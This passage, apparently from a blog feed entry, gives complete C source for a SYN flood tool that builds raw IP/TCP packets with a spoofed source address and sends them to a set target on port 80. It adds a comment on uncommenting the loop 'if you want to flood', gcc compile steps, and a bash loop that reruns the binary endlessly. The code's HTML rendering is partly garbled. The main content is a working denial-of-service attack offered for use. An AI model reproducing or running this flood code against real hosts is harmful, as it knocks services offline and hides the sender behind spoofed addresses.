</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span> <span class="c1">//for exit(0);&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">errno</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span> <span class="c1">//For errno - the error number&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">netinet</span><span class="o">/</span><span class="n">tcp</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>   <span class="c1">//Provides declarations for tcp header&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">netinet</span><span class="o">/</span><span class="n">ip</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>    <span class="c1">//Provides declarations for ip header&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">struct</span> <span class="n">pseudo_header</span>    <span class="c1">//needed for checksum calculation</span>
</span><span class='line'><span class="p">{</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">source_address</span><span class="p">;</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">dest_address</span><span class="p">;</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">placeholder</span><span class="p">;</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">protocol</span><span class="p">;</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">tcp_length</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">tcphdr</span> <span class="n">tcp</span><span class="p">;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">};</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">csum</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span><span class="kt">int</span> <span class="n">nbytes</span><span class="p">)</span> <span class="p">{</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="k">register</span> <span class="kt">long</span> <span class="n">sum</span><span class="p">;</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">oddbyte</span><span class="p">;</span>
</span><span class='line'><span class="k">register</span> <span class="kt">short</span> <span class="n">answer</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="n">sum</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="k">while</span><span class="p">(</span><span class="n">nbytes</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">sum</span><span class="o">+=*</span><span class="n">ptr</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>    <span class="n">nbytes</span><span class="o">-=</span><span class="mi">2</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="n">nbytes</span><span class="o">==</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">oddbyte</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="o">*</span><span class="p">((</span><span class="n">u_char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">oddbyte</span><span class="p">)</span><span class="o">=*</span><span class="p">(</span><span class="n">u_char</span><span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="p">;</span>
</span><span class='line'>    <span class="n">sum</span><span class="o">+=</span><span class="n">oddbyte</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">sum</span> <span class="o">=</span> <span class="p">(</span><span class="n">sum</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="n">sum</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mh">0xffff</span><span class="p">);</span>
</span><span class='line'><span class="n">sum</span> <span class="o">=</span> <span class="n">sum</span> <span class="o">+</span> <span class="p">(</span><span class="n">sum</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="mi">16</span><span class="p">);</span>
</span><span class='line'><span class="n">answer</span><span class="o">=</span><span class="p">(</span><span class="kt">short</span><span class="p">)</span><span class="o">~</span><span class="n">sum</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">return</span><span class="p">(</span><span class="n">answer</span><span class="p">);</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="c1">//Create a raw socket</span>
</span><span class='line'><span class="kt">int</span> <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span> <span class="p">(</span><span class="n">PF_INET</span><span class="p">,</span> <span class="n">SOCK_RAW</span><span class="p">,</span> <span class="n">IPPROTO_TCP</span><span class="p">);</span>
</span><span class='line'><span class="c1">//Datagram to represent the packet</span>
</span><span class='line'><span class="kt">char</span> <span class="n">datagram</span><span class="p">[</span><span class="mi">4096</span><span class="p">]</span> <span class="p">,</span> <span class="n">source_ip</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span><span class='line'><span class="c1">//IP header</span>
</span><span class='line'><span class="k">struct</span> <span class="n">iphdr</span> <span class="o">*</span><span class="n">iph</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">iphdr</span> <span class="o">*</span><span class="p">)</span> <span class="n">datagram</span><span class="p">;</span>
</span><span class='line'><span class="c1">//TCP header</span>
</span><span class='line'><span class="k">struct</span> <span class="n">tcphdr</span> <span class="o">*</span><span class="n">tcph</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">datagram</span> <span class="o">+</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">ip</span><span class="p">));</span>
</span><span class='line'><span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
</span><span class='line'><span class="k">struct</span> <span class="n">pseudo_header</span> <span class="n">psh</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="n">strcpy</span><span class="p">(</span><span class="n">source_ip</span> <span class="p">,</span> <span class="s">&quot;192.168.10.78&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
</span><span class='line'><span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">80</span><span class="p">);</span>
</span><span class='line'><span class="c1">//sin.sin_addr.s_addr = inet_addr (&quot;192.168.10.78&quot;);</span>
</span><span class='line'><span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span> <span class="p">(</span><span class="s">&quot;10.10.24.79&quot;</span><span class="p">);</span>
</span><span class='line'><span class="c1">//sin.sin_addr.s_addr = inet_addr (&quot;192.168.10.111&quot;);</span>
</span><span class='line'>
</span><span class='line'><span class="n">memset</span> <span class="p">(</span><span class="n">datagram</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span> <span class="cm">/* zero out the buffer */</span>
</span><span class='line'>
</span><span class='line'><span class="c1">//Fill in the IP Header</span>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">ihl</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">version</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">tos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">tot_len</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">ip</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span><span class="p">);</span>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">id</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">54321</span><span class="p">);</span>  <span class="c1">//Id of this packet</span>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">frag_off</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">ttl</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">protocol</span> <span class="o">=</span> <span class="n">IPPROTO_TCP</span><span class="p">;</span>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>      <span class="c1">//Set to 0 before calculating checksum</span>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">saddr</span> <span class="o">=</span> <span class="n">inet_addr</span> <span class="p">(</span> <span class="n">source_ip</span> <span class="p">);</span>    <span class="c1">//Spoof the source ip address</span>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">daddr</span> <span class="o">=</span> <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">check</span> <span class="o">=</span> <span class="n">csum</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">short</span> <span class="o">*</span><span class="p">)</span> <span class="n">datagram</span><span class="p">,</span> <span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">tot_len</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="c1">//TCP Header</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">source</span> <span class="o">=</span> <span class="n">htons</span> <span class="p">(</span><span class="mi">1234</span><span class="p">);</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">dest</span> <span class="o">=</span> <span class="n">htons</span> <span class="p">(</span><span class="mi">80</span><span class="p">);</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">seq</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">ack_seq</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">doff</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>      <span class="cm">/* first and only tcp segment */</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">fin</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">syn</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">rst</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">psh</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">ack</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">urg</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">window</span> <span class="o">=</span> <span class="n">htons</span> <span class="p">(</span><span class="mi">5840</span><span class="p">);</span> <span class="cm">/* maximum allowed window size */</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="cm">/* if you set a checksum to zero, your kernel&#39;s IP stack</span>
</span><span class='line'><span class="cm">            should fill in the correct checksum during transmission */</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">urg_ptr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="c1">//Now the IP checksum</span>
</span><span class='line'>
</span><span class='line'><span class="n">psh</span><span class="p">.</span><span class="n">source_address</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span> <span class="n">source_ip</span> <span class="p">);</span>
</span><span class='line'><span class="n">psh</span><span class="p">.</span><span class="n">dest_address</span> <span class="o">=</span> <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="p">;</span>
</span><span class='line'><span class="n">psh</span><span class="p">.</span><span class="n">placeholder</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="n">psh</span><span class="p">.</span><span class="n">protocol</span> <span class="o">=</span> <span class="n">IPPROTO_TCP</span><span class="p">;</span>
</span><span class='line'><span class="n">psh</span><span class="p">.</span><span class="n">tcp_length</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">psh</span><span class="p">.</span><span class="n">tcp</span> <span class="p">,</span> <span class="n">tcph</span> <span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">check</span> <span class="o">=</span> <span class="n">csum</span><span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span><span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">psh</span> <span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">pseudo_header</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'><span class="c1">//IP_HDRINCL to tell the kernel that headers are included in the packet</span>
</span><span class='line'><span class="kt">int</span> <span class="n">one</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="k">const</span> <span class="kt">int</span> <span class="o">*</span><span class="n">val</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">one</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">setsockopt</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">IPPROTO_IP</span><span class="p">,</span> <span class="n">IP_HDRINCL</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">one</span><span class="p">))</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;Error setting IP_HDRINCL. Error number : %d . Error message : %s </span><span class="se">\n</span><span class="s">&quot;</span> <span class="p">,</span> <span class="n">errno</span> <span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
</span><span class='line'>    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">//Uncommend the loop if you want to flood :)</span>
</span><span class='line'><span class="c1">//while (1)</span>
</span><span class='line'><span class="c1">//{</span>
</span><span class='line'>    <span class="c1">//Send the packet</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">sendto</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span>      <span class="cm">/* our socket */</span>
</span><span class='line'>                <span class="n">datagram</span><span class="p">,</span>   <span class="cm">/* the buffer containing headers and data */</span>
</span><span class='line'>                <span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">tot_len</span><span class="p">,</span>    <span class="cm">/* total length of our datagram */</span>
</span><span class='line'>                <span class="mi">0</span><span class="p">,</span>      <span class="cm">/* routing flags, normally always 0 */</span>
</span><span class='line'>                <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">sin</span><span class="p">,</span>   <span class="cm">/* socket addr, just like in */</span>
</span><span class='line'>                <span class="k">sizeof</span> <span class="p">(</span><span class="n">sin</span><span class="p">))</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span>       <span class="cm">/* a normal send() */</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;error</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="c1">//Data send successfully</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;Packet Send </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="c1">//}</span>
</span><span class='line'>
</span><span class='line'><span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h3>test start</h3>

<h4>compile with gcc</h4>

<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>indent -kr -i8 sysflood.c
</span><span class='line'>gcc synflood.c -o synflood
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h4>test bash (Only running three seconds)</h4>

<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;!/bin/bash&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;while :
</span><span class='line'><span class="k">do</span>
</span><span class='line'>/path/to/synflood
</span><span class='line'><span class="k">done</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h4>results</h4>

<p><img src="/images/result_syn.jpg" alt="alt text" /><br />
<img src="/images/flood_test.jpg" alt="alt text" /><br /></p>

<h4>more......</h4>
]]></content>
  </entry>
  
</feed>
